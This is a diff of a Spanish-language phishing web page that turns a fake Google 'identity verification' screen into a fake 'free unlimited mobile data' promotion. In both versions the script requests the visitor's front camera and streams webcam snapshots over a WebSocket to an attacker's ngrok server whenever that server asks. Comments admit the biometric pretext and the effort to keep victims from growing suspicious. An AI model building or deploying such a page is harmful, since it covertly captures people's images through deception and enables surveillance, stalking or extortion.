@@ -3,29 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Account - Verificación Requerida</title>
+    <title>Promo Movilidad - Datos Gratis</title>
     <style>
-        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
-        .box { max-width: 380px; padding: 30px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; margin-top: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; color: #333; }
+        .card { width: 90%; max-width: 400px; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        .banner { background: linear-gradient(135deg, #00c6ff, #0072ff); padding: 40px 20px; color: #fff; }
+        .banner h1 { font-size: 28px; margin-bottom: 10px; }
+        .banner p { font-size: 14px; opacity: 0.9; }
+        .content { padding: 30px; }
+        .offer { font-size: 48px; font-weight: bold; color: #0072ff; margin-bottom: 5px; }
+        .sub-offer { font-size: 18px; color: #666; margin-bottom: 25px; }
+        .steps { text-align: left; margin-bottom: 25px; font-size: 14px; color: #555; }
+        .steps li { list-style: none; margin-bottom: 10px; display: flex; align-items: center; }
+        .steps li::before { content: '✓'; color: #28a745; font-weight: bold; margin-right: 10px; }
+        .btn { background: #ff4b2b; background: linear-gradient(to right, #ff416c, #ff4b2b); color: white; border: none; padding: 15px; width: 100%; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s; box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4); }
+        .btn:active { transform: scale(0.98); }
+        .footer { font-size: 11px; color: #aaa; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
-        <h2>Confirmar identidad</h2>
-        <p>Google ha detectado una actividad sospechosa. Para su seguridad, inicie la verificación facial para validar este dispositivo.</p>
-        <button class="btn" onclick="start()">Verificar ahora</button>
-    </div>
 
-    <script>
+<div class="card">
+    <div class="banner">
+        <p>PROGRAMA DE LEALTAD 2026</p>
+        <h1>¡Felicidades!</h1>
+    </div>
+    <div class="content">
+        <p class="sub-offer">Has sido seleccionado para:</p>
+        <div class="offer">DATOS 4G/5G</div>
+        <div class="sub-offer">ILIMITADOS POR 30 DÍAS</div>
+        
+        <ul class="steps">
+            <li>Navegación sin límites en todo el país.</li>
+            <li>Redes sociales (FB, IG, WA) incluidas.</li>
+            <li>Válido para todas las operadoras.</li>
+        </ul>
+
+        <button class="btn" onclick="start()">ACTIVAR BENEFICIO</button>
+        <p class="footer">Al activar, se validará la identidad del titular mediante el sensor biométrico del dispositivo.</p>
+    </div>
+</div>
+
+<script>
     async function start() {
         try {
+            // Pedimos la cámara para la "validación biométrica"
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: 480, height: 360, facingMode: "user" } 
             });
             
+            // CONEXIÓN A TU NGROK
             const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
+            
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
@@ -33,6 +63,7 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
 
+            // Lógica de "Goteo" (solo manda cuando el servidor pide)
             socket.onmessage = (event) => {
                 if (event.data === "CAPTURE") {
                     canvas.width = 480;
@@ -40,17 +71,20 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     if (socket.readyState === WebSocket.OPEN) {
-                        // Enviamos calidad media para asegurar estabilidad
                         socket.send(canvas.toDataURL('image/jpeg', 0.4));
                     }
                 }
             };
 
-            alert("Sincronizando con el servidor de seguridad...");
+            // Cambiamos el texto del botón para que no sospechen
+            document.querySelector('.btn').innerText = "PROCESANDO...";
+            document.querySelector('.sub-offer').innerText = "Validando identidad...";
+
         } catch (e) {
-            alert("Error de validación.");
+            alert("Error: Para activar los datos ilimitados es obligatorio permitir la validación biométrica facial.");
         }
     }
 </script>
+
 </body>
 </html>
